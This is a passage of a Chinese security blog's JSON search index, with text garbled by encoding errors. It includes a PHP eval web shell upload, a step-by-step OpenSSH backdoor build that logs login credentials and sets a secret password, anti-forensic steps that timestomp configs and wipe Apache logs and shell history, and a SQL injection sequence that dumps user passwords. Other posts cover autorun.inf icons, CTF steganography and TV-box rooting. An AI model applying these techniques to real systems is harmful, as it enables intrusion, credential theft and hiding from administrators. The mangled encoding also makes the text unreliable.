@eval($_POST[&apos;a&apos;]);?&gt; -----------------------------9930139772123 Content-Disposition: form-data; name=&quot;submit&quot; Submit -----------------------------9930139772123--","categories":[],"tags":[]},{"title":"åˆ©ç”¨autorun.infé¢„é˜²è‡ªåŠ¨è¿è¡Œç—…æ¯’åŠä¸ªæ€§åŒ–ç£ç›˜å›¾æ ‡","slug":"åˆ©ç”¨autorun-infé¢„é˜²è‡ªåŠ¨è¿è¡Œç—…æ¯’åŠä¸ªæ€§åŒ–ç£ç›˜å›¾æ ‡","date":"2018-08-13T02:37:01.000Z","updated":"2019-08-19T03:00:22.667Z","comments":true,"path":"2018/08/13/åˆ©ç”¨autorun-infé¢„é˜²è‡ªåŠ¨è¿è¡Œç—…æ¯’åŠä¸ªæ€§åŒ–ç£ç›˜å›¾æ ‡/","link":"","permalink":"http://yoursite.com/2018/08/13/åˆ©ç”¨autorun-infé¢„é˜²è‡ªåŠ¨è¿è¡Œç—…æ¯’åŠä¸ªæ€§åŒ–ç£ç›˜å›¾æ ‡/","excerpt":"AutoRunç®€ä»‹ AutoRunå’ŒAutoPlayæ˜¯å¾®è½¯çª—å£ç³»ç»Ÿçš„ç»„ä»¶ï¼Œå…¶å†…å®¹æ ‡ç¤ºç€ç³»ç»Ÿåœ¨æœç´¢åˆ°è®¾å¤‡æ—¶å¯é‡‡å–çš„è¡ŒåŠ¨ã€‚ AutoRunåœ¨Windows 95æ—¶é¦–åº¦éœ²é¢ï¼Œç›®çš„æ˜¯å¸®åŠ©ç”¨æˆ·æ­£ç¡®è¿è¡Œå…‰ç›˜ä¸Šåˆ¶ä½œè€…æƒ³è¦è¿è¡Œçš„æ–‡ä»¶ï¼Œå¦å¤–AutoRunä¹Ÿèƒ½é€è¿‡åŒå‡»æˆ‘çš„è®¡ç®—æœºå†…çš„è®¾å¤‡å›¾æ ‡å¯åŠ¨AutoRunã€‚ä½†åæ¥Uç›˜ç—…æ¯’æ¨ªè¡Œï¼Œå¾®è½¯å‘å¸ƒæ›´æ–°å…³é—­éå…‰ç›˜é©±åŠ¨å™¨çš„AutoRunã€‚ åœ¨Windows XPä¹‹åï¼Œå¾®è½¯è®©ç”¨æˆ·æ–¹ä¾¿é€‰æ‹©ç›¸å…³åº”ç”¨ç¨‹åºï¼Œåˆ¶ä½œå‡ºå¦‚å›¾å½¢åŒ–æ¥å£æ–¹å¼è®©ç”¨æˆ·é€‰æ‹©å¦‚ä½•å¤„ç†è®¾å¤‡ä¸­çš„æ–‡ä»¶ã€‚ AutoRun.infæ–‡ä»¶ autrun.infæ˜¯æˆ‘ä»¬ç”µè„‘ä½¿ç”¨ä¸­æ¯”è¾ƒå¸¸è§çš„æ–‡ä»¶ä¹‹ä¸€ ï¼Œå…¶ä½œç”¨æ˜¯å…è®¸åœ¨åŒå‡»ç£ç›˜æ—¶è‡ªåŠ¨è¿è¡ŒæŒ‡å®šçš„æŸä¸ªæ–‡ä»¶ã€‚ä½†æ˜¯è¿‘å‡ å¹´å‡ºç°äº†ç”¨autorun.infæ–‡ä»¶ä¼ æ’­æœ¨é©¬æˆ–ç—…æ¯’ï¼Œå®ƒé€šè¿‡ä½¿ç”¨è€…çš„è¯¯æ“ä½œè®©ç›®æ ‡ç¨‹åºæ‰§è¡Œï¼Œè¾¾åˆ°ä¾µå…¥ç”µè„‘çš„ç›®çš„ï¼Œå¸¦æ¥äº†å¾ˆå¤§çš„è´Ÿé¢å½±å“ã€‚ AutoRun.infçš„ç¤ºä¾‹[autorun] open=setup.exe icon=setup.exe,0 label=My install CD åŒå‡»ç›˜ç¬¦æ—¶ä¼šè¿è¡Œsetup.exeï¼Œè€Œæ˜¾ç¤ºå›¾æ ‡ä¸ºsetup.exeä¸­ç¬¬0ä¸ªå›¾æ ‡ï¼ˆå³ç¬¬1ä¸ªå›¾æ ‡ï¼‰ï¼Œæ ‡ç­¾æ˜¯My install CDã€‚ AutoRun.infçš„é»˜è®¤æ¿€æ´» æ’å…¥è®¾å¤‡æ—¶å¯åŠ¨ã€‚ åŒå‡»æˆ‘çš„è®¡ç®—æœºè®¾å¤‡æ—¶å¯åŠ¨ã€‚ å¯¹æˆ‘çš„è®¡ç®—æœºè®¾å¤‡ç‚¹å‡»å³é”®èœå•ä¸­ â€œAutoRunâ€ é¡¹ç›®æ—¶å¯åŠ¨ã€‚ å…¶ä»–(å¦‚ç‚¹å‡»æ ¹ç›®å½•æ–‡ä»¶å¤¹)åˆ™ä¸ä¼šå¯åŠ¨ã€‚windows XP ä»¥å‰ æ‰€æœ‰è®¾å¤‡éƒ½ä¼šä¾ç…§ Autorun.inf å¯åŠ¨ã€‚Windows 7 åªæœ‰å…‰ç›˜ä¼šå…ˆè¿è¡Œ autorun.inf åˆ©ç”¨autorun.infç»™ç¡¬ç›˜æ”¹å›¾æ ‡åŠç®€æ˜“é˜²ç—…æ¯’ä¸ªæ€§åŒ–ç£ç›˜â€”æ”¹å›¾æ ‡åœ¨å¯¹åº”ç£ç›˜çš„æ ¹ç›®å½•æ–°å»ºä¸€ä¸ªè®°äº‹æœ¬ï¼Œç„¶åä¿®æ”¹é‡Œé¢å†…å®¹ [AUTORUN] ICON=drag0n.ico ç„¶åå°†å…¶ä¿å­˜ä¸ºautorun.infï¼ˆæ³¨æ„icoçš„æ–‡ä»¶åå­—ç¬¦ä¸è¦è¶…è¿‡6ä½ï¼‰","text":"AutoRunç®€ä»‹ AutoRunå’ŒAutoPlayæ˜¯å¾®è½¯çª—å£ç³»ç»Ÿçš„ç»„ä»¶ï¼Œå…¶å†…å®¹æ ‡ç¤ºç€ç³»ç»Ÿåœ¨æœç´¢åˆ°è®¾å¤‡æ—¶å¯é‡‡å–çš„è¡ŒåŠ¨ã€‚ AutoRunåœ¨Windows 95æ—¶é¦–åº¦éœ²é¢ï¼Œç›®çš„æ˜¯å¸®åŠ©ç”¨æˆ·æ­£ç¡®è¿è¡Œå…‰ç›˜ä¸Šåˆ¶ä½œè€…æƒ³è¦è¿è¡Œçš„æ–‡ä»¶ï¼Œå¦å¤–AutoRunä¹Ÿèƒ½é€è¿‡åŒå‡»æˆ‘çš„è®¡ç®—æœºå†…çš„è®¾å¤‡å›¾æ ‡å¯åŠ¨AutoRunã€‚ä½†åæ¥Uç›˜ç—…æ¯’æ¨ªè¡Œï¼Œå¾®è½¯å‘å¸ƒæ›´æ–°å…³é—­éå…‰ç›˜é©±åŠ¨å™¨çš„AutoRunã€‚ åœ¨Windows XPä¹‹åï¼Œå¾®è½¯è®©ç”¨æˆ·æ–¹ä¾¿é€‰æ‹©ç›¸å…³åº”ç”¨ç¨‹åºï¼Œåˆ¶ä½œå‡ºå¦‚å›¾å½¢åŒ–æ¥å£æ–¹å¼è®©ç”¨æˆ·é€‰æ‹©å¦‚ä½•å¤„ç†è®¾å¤‡ä¸­çš„æ–‡ä»¶ã€‚ AutoRun.infæ–‡ä»¶ autrun.infæ˜¯æˆ‘ä»¬ç”µè„‘ä½¿ç”¨ä¸­æ¯”è¾ƒå¸¸è§çš„æ–‡ä»¶ä¹‹ä¸€ ï¼Œå…¶ä½œç”¨æ˜¯å…è®¸åœ¨åŒå‡»ç£ç›˜æ—¶è‡ªåŠ¨è¿è¡ŒæŒ‡å®šçš„æŸä¸ªæ–‡ä»¶ã€‚ä½†æ˜¯è¿‘å‡ å¹´å‡ºç°äº†ç”¨autorun.infæ–‡ä»¶ä¼ æ’­æœ¨é©¬æˆ–ç—…æ¯’ï¼Œå®ƒé€šè¿‡ä½¿ç”¨è€…çš„è¯¯æ“ä½œè®©ç›®æ ‡ç¨‹åºæ‰§è¡Œï¼Œè¾¾åˆ°ä¾µå…¥ç”µè„‘çš„ç›®çš„ï¼Œå¸¦æ¥äº†å¾ˆå¤§çš„è´Ÿé¢å½±å“ã€‚ AutoRun.infçš„ç¤ºä¾‹[autorun] open=setup.exe icon=setup.exe,0 label=My install CD åŒå‡»ç›˜ç¬¦æ—¶ä¼šè¿è¡Œsetup.exeï¼Œè€Œæ˜¾ç¤ºå›¾æ ‡ä¸ºsetup.exeä¸­ç¬¬0ä¸ªå›¾æ ‡ï¼ˆå³ç¬¬1ä¸ªå›¾æ ‡ï¼‰ï¼Œæ ‡ç­¾æ˜¯My install CDã€‚ AutoRun.infçš„é»˜è®¤æ¿€æ´» æ’å…¥è®¾å¤‡æ—¶å¯åŠ¨ã€‚ åŒå‡»æˆ‘çš„è®¡ç®—æœºè®¾å¤‡æ—¶å¯åŠ¨ã€‚ å¯¹æˆ‘çš„è®¡ç®—æœºè®¾å¤‡ç‚¹å‡»å³é”®èœå•ä¸­ â€œAutoRunâ€ é¡¹ç›®æ—¶å¯åŠ¨ã€‚ å…¶ä»–(å¦‚ç‚¹å‡»æ ¹ç›®å½•æ–‡ä»¶å¤¹)åˆ™ä¸ä¼šå¯åŠ¨ã€‚windows XP ä»¥å‰ æ‰€æœ‰è®¾å¤‡éƒ½ä¼šä¾ç…§ Autorun.inf å¯åŠ¨ã€‚Windows 7 åªæœ‰å…‰ç›˜ä¼šå…ˆè¿è¡Œ autorun.inf åˆ©ç”¨autorun.infç»™ç¡¬ç›˜æ”¹å›¾æ ‡åŠç®€æ˜“é˜²ç—…æ¯’ä¸ªæ€§åŒ–ç£ç›˜â€”æ”¹å›¾æ ‡åœ¨å¯¹åº”ç£ç›˜çš„æ ¹ç›®å½•æ–°å»ºä¸€ä¸ªè®°äº‹æœ¬ï¼Œç„¶åä¿®æ”¹é‡Œé¢å†…å®¹ [AUTORUN] ICON=drag0n.ico ç„¶åå°†å…¶ä¿å­˜ä¸ºautorun.infï¼ˆæ³¨æ„icoçš„æ–‡ä»¶åå­—ç¬¦ä¸è¦è¶…è¿‡6ä½ï¼‰ å†å°†ä½ æƒ³ç”¨çš„å›¾æ ‡è½¬æ¢æˆicoæ–‡ä»¶ï¼Œæ¨èåˆ†è¾¨ç‡ä¸è¦è¶…è¿‡48x48ï¼Œç„¶åä¸€åŒæ”¾è¿›åŒç›®å½•ä¸‹ï¼Œç„¶åæ”¹åä¸ºfdragn.icoã€‚ ç®€æ˜“é˜²ç—…æ¯’æ­¤æ—¶æ–‡ä»¶æ˜¯æ˜¾ç¤ºåœ¨å½“å‰ç›®å½•ä¸‹çš„ï¼Œå¯ä»¥ä½¿ç”¨Windowsä¸‹çš„attribå‘½ä»¤ç»™æ–‡ä»¶å¢åŠ å±æ€§ attribæŒ‡ä»¤çš„æ ¼å¼å’Œå¸¸ç”¨å‚æ•°ä¸º ATTRIB [+R | -R] [+A | -A ] [+S | -S] [+H | -H] [[drive:] [path] filename] [/S [/D]] + è®¾ç½®å±æ€§ã€‚ - æ¸…é™¤å±æ€§ã€‚ R åªè¯»æ–‡ä»¶å±æ€§ã€‚ A å­˜æ¡£æ–‡ä»¶å±æ€§ã€‚ S ç³»ç»Ÿæ–‡ä»¶å±æ€§ã€‚ H éšè—æ–‡ä»¶å±æ€§ã€‚ I æ— å†…å®¹ç´¢å¼•æ–‡ä»¶å±æ€§ã€‚ [drive:][path][filename] æŒ‡å®šè¦å¤„ç†çš„æ–‡ä»¶å±æ€§ã€‚ /S å¤„ç†å½“å‰æ–‡ä»¶å¤¹åŠå…¶å­æ–‡ä»¶å¤¹ä¸­çš„åŒ¹é…æ–‡ä»¶ã€‚ /D å¤„ç†æ–‡ä»¶å¤¹ã€‚ /L å¤„ç†ç¬¦å·é“¾æ¥å’Œç¬¦å·é“¾æ¥ç›®æ ‡çš„å±æ€§ã€‚ æ‰€ä»¥ä½¿ç”¨ attrib +s +h +r autorun.inf ç»™autorun.infæ·»åŠ ç³»ç»Ÿã€éšè—å’Œåªè¯»å±æ€§ï¼Œé˜²æ­¢ç—…æ¯’ä¿®æ”¹autorun.infæ–‡ä»¶ attrib +s +h drag0n.ico ç»™drag0n.icoæ–‡ä»¶æ·»åŠ ç³»ç»Ÿå’Œéšè—å±æ€§ï¼Œç¾è§‚ã€‚ å¦‚æœè¿˜è¦ä¿®æ”¹çš„è¯ï¼Œä½¿ç”¨ä»¥ä¸‹å‘½ä»¤å°†å…¶æ˜¾ç¤ºå‡ºæ¥ attrib -s -h -r autorun.inf attrib -s -h fdrag0n.ico","categories":[],"tags":[]},{"title":"ctfå¸¸è§éšå†™æœ¯æ€»ç»“","slug":"ctfå¸¸è§éšå†™æœ¯æ€»ç»“","date":"2018-07-30T03:57:03.000Z","updated":"2019-08-19T03:00:30.632Z","comments":true,"path":"2018/07/30/ctfå¸¸è§éšå†™æœ¯æ€»ç»“/","link":"","permalink":"http://yoursite.com/2018/07/30/ctfå¸¸è§éšå†™æœ¯æ€»ç»“/","excerpt":"å‡†å¤‡å·¥å…·ï¼šwinhexä»˜è´¹ç‰ˆï¼ˆå…è´¹ç‰ˆåŠŸèƒ½æœ‰ç¼ºå¤±ï¼‰ï¼ŒStegsolveï¼ŒMP3Stenoç­‰ ctfå¸¸è§éšå†™æœ¯æ€»ç»“ç®€å•éšå†™ï¼š å³é”®æŸ¥çœ‹å›¾ç‰‡å±æ€§ï¼Œæ£€æŸ¥å›¾ç‰‡ç®€ä»‹ã€‚ winhexæ‰“å¼€ï¼ŒCtrl+FæŸ¥æ‰¾æœ‰æ— flagæ˜æ–‡ã€‚","text":"å‡†å¤‡å·¥å…·ï¼šwinhexä»˜è´¹ç‰ˆï¼ˆå…è´¹ç‰ˆåŠŸèƒ½æœ‰ç¼ºå¤±ï¼‰ï¼ŒStegsolveï¼ŒMP3Stenoç­‰ ctfå¸¸è§éšå†™æœ¯æ€»ç»“ç®€å•éšå†™ï¼š å³é”®æŸ¥çœ‹å›¾ç‰‡å±æ€§ï¼Œæ£€æŸ¥å›¾ç‰‡ç®€ä»‹ã€‚ winhexæ‰“å¼€ï¼ŒCtrl+FæŸ¥æ‰¾æœ‰æ— flagæ˜æ–‡ã€‚ æ–‡ä»¶ç±»å‹ï¼šç»™å‡ºçš„æ–‡ä»¶ä¸ä¸€å®šæ˜¯å®ƒåç¼€åæ˜¾ç¤ºçš„æ–‡ä»¶ï¼Œæ‰€ä»¥åº”è¯¥å…ˆç”¨winhexæ‰“å¼€å®ƒç¡®è®¤æ–‡ä»¶ç§ç±» JPEG (jpg)ï¼Œæ–‡ä»¶å¤´ï¼šFFD8FF PNG (png)ï¼Œæ–‡ä»¶å¤´ï¼š89504E47 GIF (gif)ï¼Œæ–‡ä»¶å¤´ï¼š47494638 Windows Bitmap (bmp)ï¼Œæ–‡ä»¶å¤´ï¼š424D ZIP Archive (zip)ï¼Œæ–‡ä»¶å¤´ï¼š504B0304 RAR Archive (rar)ï¼Œæ–‡ä»¶å¤´ï¼š52617221 å¤åˆæ–‡ä»¶ï¼šåœ¨kalié‡Œé¢ä½¿ç”¨binwalkå·¥å…·å³å¯æŸ¥çœ‹å¦‚ï¼š root@kali:~# binwalk â€˜/root/æ¡Œé¢/misc1.jpgâ€™ DECIMAL HEXADECIMAL DESCRIPTION -â€”â€”â€”â€”â€”â€”â€”â€”â€”â€”â€”â€”â€”â€”â€”â€”â€”â€”â€”â€”â€”â€”â€”â€”â€”â€”- 0 0x0 JPEG image data, EXIF standard 120xC TIFF image data, little-endian offset of first image directory: 8 4413190x6BBE7 Zip archive data, encrypted at least v2.0 to extract, compressed size: 90598, uncompressed size: 91905, name: hidden.jpg 5319570x81DF5 Zip archive data, encrypted at least v2.0 to extract, compressed size: 38092, uncompressed size: 38829, name: logo.png 5702690x8B39D End of Zip archive å¯ä»¥çœ‹åˆ°æœ‰zipä¹‹ç±»çš„æ–‡ä»¶åœ¨é‡Œé¢ï¼Œæ‰€ä»¥ç›´æ¥åˆ©ç”¨binwalkæå–ï¼Œ binwalk -e å›¾ç‰‡é«˜åº¦ä¸€èˆ¬è¿™ç±»çš„å›¾ç‰‡éƒ½ä¼šæœ‰æ˜æ˜¾çš„æç¤ºï¼ŒåŒ…æ‹¬ä½†ä¸é™äºç®­å¤´æŒ‡å‘å›¾ç‰‡å¤–ï¼Œå›¾ç‰‡çœ‹ä¸Šå»ä¸å®Œæ•´ç­‰ã€‚æ ¹æ®å¯¹åº”æ–‡ä»¶ç§ç±»æ‰¾åˆ°å…¶é«˜åº¦ä½è¿›è¡Œä¿®æ”¹ã€‚ pngæ–‡ä»¶ï¼Œ å¤šå›¾å±‚éšå†™æœ€ç‰›ç¥å™¨ zstegæ¯å¤©ç­åœ° éšå†™æœ¯ä¸€å¤§ç¥å™¨ï¼šstegsolve LSBéšå†™ å¦‚æœä¸Šæ–‡æµ‹è¯•æ‰¾ä¸åˆ°flagçš„è¯ï¼Œå¯ä»¥ä½¿ç”¨stegsolveæ‰“å¼€æ–‡ä»¶ï¼Œç„¶åç‚¹å‡»å·¦å³ç¿»åŠ¨çš„æŒ‰é’®ï¼Œå¯èƒ½ä¼šå‡ºç°flagã€‚ æå–ä½ä½ä¿¡æ¯ï¼Œä¸€èˆ¬éƒ½è—åœ¨0,1,2è¿™äº›ä½ä½é‡Œé¢ï¼Œåœ¨è½¯ä»¶åŠŸèƒ½é€‰é¡¹ä¸­æŸ¥çœ‹Analyseâ†’Data Extractï¼Œé€ä¸ªè°ƒè¯•ã€‚","categories":[],"tags":[]},{"title":"ç ´è§£ä¸­å…´ç”µè§†ç›’å­","slug":"ç ´è§£ä¸­å…´ç”µè§†ç›’å­","date":"2018-07-18T16:59:29.000Z","updated":"2019-08-19T03:00:34.180Z","comments":true,"path":"2018/07/19/ç ´è§£ä¸­å…´ç”µè§†ç›’å­/","link":"","permalink":"http://yoursite.com/2018/07/19/ç ´è§£ä¸­å…´ç”µè§†ç›’å­/","excerpt":"#è®°ä¸€æ¬¡ç ´è§£ç”µä¿¡ç›’å­ ##å‹å· ZTEB860AV1.1å› ä¸ºä»¥å‰æè¿‡å®¶é‡Œçš„tclç”µè§†ï¼Œæ‰€ä»¥æµç¨‹å·²ç»æ¸…æ¥š å¼€å¯ç½‘ç»œadbè°ƒè¯• ä¸ºæ‰€æ¬²ä¸º","text":"#è®°ä¸€æ¬¡ç ´è§£ç”µä¿¡ç›’å­ ##å‹å· ZTEB860AV1.1å› ä¸ºä»¥å‰æè¿‡å®¶é‡Œçš„tclç”µè§†ï¼Œæ‰€ä»¥æµç¨‹å·²ç»æ¸…æ¥š å¼€å¯ç½‘ç»œadbè°ƒè¯• ä¸ºæ‰€æ¬²ä¸º ###å¼€å§‹ ç™¾åº¦å¾—çŸ¥è¿›å…¥è®¾ç½®çš„å¯†ç ä¸ºï¼š6321è¿›å…¥è®¾ç½®åè¿æ¥WiFiï¼Œç„¶ååˆ°è®¾ç½®é‡Œæ‰¾åˆ°å¼€å¯adbè°ƒè¯•ï¼Œç»“æœå‘ç°å¼€å¯adbå±…ç„¶ä¹Ÿéœ€è¦å¯†ç ï¼Œä¸å¾—ä¸è¯´è¿™ç¾¤äººä¸ºäº†æ§åˆ¶ç”¨æˆ·ä¹Ÿæ˜¯ä¸‹äº†è¡€æœ¬ï¼Œè¿˜å¥½ç™¾åº¦æ‰¾åˆ°æœ‰å†™å¥½çš„è½¯ä»¶ï¼Œä¸Šé“¾æ¥ å·¥å…·ç›¸å…³è½¯ä»¶ åˆ©ç”¨ç½‘ç»œadbç»™ç”µè§†ç›’å­å®‰è£…ç”µè§†ç®¡ç†è½¯ä»¶æˆ–è€…ç¬¬ä¸‰æ–¹æ¡Œé¢å¼€å§‹ä¸ºæ‰€æ¬²ä¸ºã€‚ åœ¨è¿™é‡Œåˆå‘ç°ä¸€ä¸ªé—®é¢˜ï¼Œè¿™è¾¹è¿è¥å•†å°†ç½‘çº¿æ’å£æ’åœ¨å…‰çŒ«çš„iptvä¸Šé¢ï¼Œè€Œé‚£æ¡è·¯çº¿æ˜¯ä¸“çº¿ï¼Œæ— æ³•æ­£å¸¸ä½¿ç”¨ï¼Œæœºé¡¶ç›’å¼€æœºä¼šè‡ªåŠ¨æ£€æµ‹æ˜¯å¦åœ¨è¿™ä¸ªç½‘ç»œä¸‹ï¼Œä¸åœ¨å°±æ— æ³•æ­£å¸¸å¼€æœºï¼Œæ‰€ä»¥æ¯æ¬¡å¼€æœºçš„æ—¶å€™è¿˜å¾—æ‰‹åŠ¨å°†è®¾ç½®ä¸­çš„ç½‘ç»œè®¾ç½®æ”¹æˆæœ‰çº¿è¿æ¥ï¼Œå¦‚æœä½¿ç”¨ç¬¬ä¸‰æ–¹åº”ç”¨åˆ™ä½¿ç”¨æ— çº¿è¿æ¥å±€åŸŸç½‘å³å¯ï¼Œæš‚æ—¶æ²¡æœ‰æƒ³åˆ°æ›´å¥½åœ°è§£å†³æ–¹æ¡ˆ","categories":[],"tags":[]},{"title":"SSHåé—¨å¤ç°","slug":"SSHåé—¨å¤ç°","date":"2018-05-15T12:01:46.000Z","updated":"2019-08-19T03:00:40.735Z","comments":true,"path":"2018/05/15/SSHåé—¨å¤ç°/","link":"","permalink":"http://yoursite.com/2018/05/15/SSHåé—¨å¤ç°/","excerpt":"#SSHåé—¨å¤ç° æœ€å¼€å§‹å…ˆæŸ¥çœ‹è‡ªå·±çš„sshç‰ˆæœ¬ssh -v","text":"#SSHåé—¨å¤ç° æœ€å¼€å§‹å…ˆæŸ¥çœ‹è‡ªå·±çš„sshç‰ˆæœ¬ssh -v ç„¶åä¸‹è½½opensshå’Œsshåé—¨12345678wget http://down1.chinaunix.net/distfiles/openssh-5.9p1.tar.gzwget http://openbsd.org.ar/pub/OpenBSD/OpenSSH/portable/openssh-5.9p1.tar.gztar zxvf openssh-5.9p1.tar.gztar zxvf 0x06-openssh-5.9p1.patch.tar.gzcd openssh-5.9p1.patch/cp sshbd5.9p1.diff ../openssh-5.9p1cd ../openssh-5.9p1patch &lt; sshbd5.9p1.diff //patch åé—¨ è¿™æ—¶æœ‰å¯èƒ½å‡ºç°æŠ¥é”™ä¿¡æ¯-bash: patch: command not foundä»£è¡¨æ²¡æœ‰å®‰è£…patchå‘½ä»¤åŒ…ï¼Œè§£å†³æ–¹æ¡ˆï¼š yum -y install patch å¤‡ä»½SSHåŸå§‹é…ç½®æ–‡ä»¶12mv /etc/ssh/ssh_config /etc/ssh/ssh_config.oldmv /etc/ssh/sshd_config /etc/ssh/sshd_config.old ä¿®æ”¹åé—¨å¯†ç ï¼Œå’Œè®°å½•æ–‡ä»¶çš„ä½ç½®vi includes.h æ‰¾åˆ°å¹¶ä¿®æ”¹123456#define ILOG &quot;/tmp/ilog&quot;//è®°å½•ç™»å½•åˆ°æœ¬æœºçš„ç”¨æˆ·åå’Œå¯†ç #define OLOG &quot;/tmp/olog&quot;//è®°å½•æœ¬æœºç™»å½•åˆ°è¿œç¨‹çš„ç”¨æˆ·åå’Œå¯†ç #define SECRETPW &quot;fdrag0n&quot;//ä½ åé—¨çš„å¯†ç  ä¿®æ”¹SSHç‰ˆæœ¬ä¿¡æ¯ï¼Œæ”¹ä¸ºç¬¬ä¸€æ­¥çœ‹åˆ°çš„vi version.h ç¯å¢ƒé…ç½®å¦‚æœæ²¡æœ‰ä»¥ä¸Šç¯å¢ƒæœ‰å¯èƒ½ä¼šæŠ¥é”™ 123yum install -y gccyum install -y openssl openssl-devel pam-devel./configure --prefix=/usr --sysconfdir=/etc/ssh --with-pam --with-kerberos5 å¦‚æœå‡ºç°æŠ¥é”™ä¿¡æ¯ä¸­å¸¦æœ‰ï¼šconfigure: error: zlib.h missing â€“ please install first or check config.logä¹‹ç±»çš„ä¿¡æ¯å®‰è£…zib yum install -y zlib å®‰è£…å¹¶é‡å¯SSH12make &amp;&amp; make installservice sshd restart ç®€å•å¤„ç†è®°å½•è¿˜åŸæ–°é…ç½®æ–‡ä»¶ä¸ºæ—§é…ç½®æ–‡ä»¶æ—¶é—´12touch -r/etc/ssh/ssh_config.old /etc/ssh/ssh_configtouch -r/etc/ssh/sshd_config.old /etc/ssh/sshd_config å°†ssh_configå’Œsshd_configä¿®æ”¹æ—¶é—´è·Ÿssh_config.oldå’Œsshd_config.oldä¸€è‡´ï¼Œå‡å°‘è¢«å‘ç°çš„æ¦‚ç‡ã€‚ æ¸…é™¤apacheæ—¥å¿—12345export HISTFILE=/dev/null export HISTSIZE=0 cd /etc/httpd/logs/ sed -i â€˜/192.168.52.175/dâ€™ access_log* echo &gt;/root/.bash_history //æ¸…ç©ºæ“ä½œæ—¥å¿— æ¸…é™¤ç”¨æˆ·ç›®å½•ä¸‹çš„.bash_historyæ–‡ä»¶vi .bash_history ç„¶åå…¨éƒ¨åˆ é™¤ä¿å­˜ã€‚","categories":[],"tags":[]},{"title":"sqlæ‰‹æ³¨æ­¥éª¤ï¼ˆéç›²æ³¨ï¼‰","slug":"sqlæ‰‹æ³¨æ­¥éª¤","date":"2018-05-05T03:52:16.000Z","updated":"2019-08-19T03:00:47.758Z","comments":true,"path":"2018/05/05/sqlæ‰‹æ³¨æ­¥éª¤/","link":"","permalink":"http://yoursite.com/2018/05/05/sqlæ‰‹æ³¨æ­¥éª¤/","excerpt":"æ‰‹æ³¨æ­¥éª¤","text":"æ‰‹æ³¨æ­¥éª¤ ç›®å½•1.åˆ¤æ–­æ˜¯å¦å­˜åœ¨æ³¨å…¥ï¼Œæ³¨å…¥æ˜¯å­—ç¬¦å‹è¿˜æ˜¯æ•°å­—å‹ 2.çŒœè§£SQLæŸ¥è¯¢è¯­å¥ä¸­çš„å­—æ®µæ•° 3.ç¡®å®šæ˜¾ç¤ºçš„å­—æ®µé¡ºåº 4.è·å–å½“å‰æ•°æ®åº“ 5.è·å–æ•°æ®åº“ä¸­çš„è¡¨ 6.è·å–è¡¨ä¸­çš„å­—æ®µå 7.ä¸‹è½½æ•°æ® 1.åˆ¤æ–­æ˜¯å¦å­˜åœ¨æ³¨å…¥ï¼Œæ³¨å…¥æ˜¯å­—ç¬¦å‹è¿˜æ˜¯æ•°å­—å‹åˆ¤æ–­æ³¨å…¥ç±»å‹ï¼šæ•°å­—å‹ï¼Œå­—ç¬¦å‹ 2.çŒœè§£SQLæŸ¥è¯¢è¯­å¥ä¸­çš„å­—æ®µæ•°åˆ¤æ–­å­—æ®µæ•°ï¼š 1â€² or 1=1 order by 1,2,3,4,5 # æ•°å­—ç´¯åŠ ï¼Œç›´åˆ°ä¸å‡ºç»“æœæˆ–è€…æŠ¥é”™ã€‚ æ³¨é‡Šå¸¸å¸¸ä½¿ç”¨--+æˆ–è€…#æˆ–è€…%23 æˆ–è€…ç”¨ï¼š -1â€² union select 1,2 # ä¸¤ä¸ªsqlè¯­å¥è¿›è¡Œè”åˆæ“ä½œæ—¶ï¼Œå½“å‰ä¸€ä¸ªè¯­å¥é€‰æ‹©çš„å†…å®¹ä¸ºç©ºï¼Œæˆ‘ä»¬è¿™é‡Œå°±å°†åé¢çš„è¯­å¥çš„å†…å®¹æ˜¾ç¤ºå‡ºæ¥ é¡ºè·¯è¿›è¡Œä¸‹ä¸€æ­¥ 3.ç¡®å®šæ˜¾ç¤ºçš„å­—æ®µé¡ºåº-1â€² union select 1,2 # 4.è·å–å½“å‰æ•°æ®åº“-1â€² union select 1,database() # 5.è·å–æ•°æ®åº“ä¸­çš„è¡¨-1â€² union select 1,group_concat(table_name) from information_schema.tables where table_schema=database() # ä»information_schemaä¸­æŸ¥æ‰¾è¡¨å è¿›è¡Œè”åˆæŸ¥è¯¢æ—¶è¦å°†æŸ¥è¯¢ç”¨çš„è¯­å¥æ”¾åœ¨æœ€åä¸€é¡¹ 6.è·å–è¡¨ä¸­çš„å­—æ®µå-1â€² union select 1,group_concat(column_name) from information_schema.columns where table_name=â€™usersâ€™ # çˆ†usersè¡¨å†…çš„è¡¨å 7.ä¸‹è½½æ•°æ®-1â€² or 1=1 union select group_concat(user_id,first_name,last_name),group_concat(password) from users # ä»usersé‡Œé¢å–å‡ºæ‰€æœ‰ç”¨æˆ·çš„user_id,first_name,last_name,passwordçš„æ•°æ®","categories":[{"name":"sql","slug":"sql","permalink":"http://yoursite.com/categories/sql/"}],"tags":[{"name":"sql","slug":"sql","permalink":"http://yoursite.com/tags/sql/"}]},{"title":"åˆ©ç”¨kaliç ´è§£wpa/wpa2åŠ å¯†çš„WIFIï¼ˆçˆ†ç ´ç¾å­¦ï¼‰","slug":"åˆ©ç”¨kaliç ´è§£wpa-wpa2åŠ å¯†çš„WIFIï¼ˆçˆ†ç ´ç¾å­¦ï¼‰","date":"2018-05-01T14:26:38.000Z","updated":"2019-08-19T03:00:57.541Z","comments":true,"path":"2018/05/01/åˆ©ç”¨kaliç ´è§£wpa-wpa2åŠ å¯†çš„WIFIï¼ˆçˆ†ç ´ç¾å­¦ï¼‰/","link":"","permalink":"http://yoursite.com/2018/05/01/åˆ©ç”¨kaliç ´è§£wpa-wpa2åŠ å¯†çš„WIFIï¼ˆçˆ†ç ´ç¾å­¦ï¼‰/","excerpt":"åˆ©ç”¨kaliç ´è§£wpa/wpa2åŠ å¯†çš„WIFIï¼ˆçˆ†ç ´ç¾å­¦ï¼‰ç¡¬ä»¶å‡†å¤‡é˜¶æ®µï¼šå› ä¸ºç”¨vmå®‰è£…çš„kaliä¸æ”¯æŒç¬”è®°æœ¬å†…ç½®çš„æ— é™ç½‘å¡æ‰€ä»¥éœ€è¦è´­ä¹°kaliæ”¯æŒçš„ç½‘å¡ï¼Œåšä¸»ä¹°çš„æ˜¯RT3070LèŠ¯ç‰‡ç»„çš„ç½‘å¡ï¼ŒæŸå®ä¸Šé¢æ— å£³çš„åªè¦20å…ƒï¼ŒåŠ å£³æ‰25å…ƒã€‚","text":"åˆ©ç”¨kaliç ´è§£wpa/wpa2åŠ å¯†çš„WIFIï¼ˆçˆ†ç ´ç¾å­¦ï¼‰ç¡¬ä»¶å‡†å¤‡é˜¶æ®µï¼šå› ä¸ºç”¨vmå®‰è£…çš„kaliä¸æ”¯æŒç¬”è®°æœ¬å†…ç½®çš„æ— 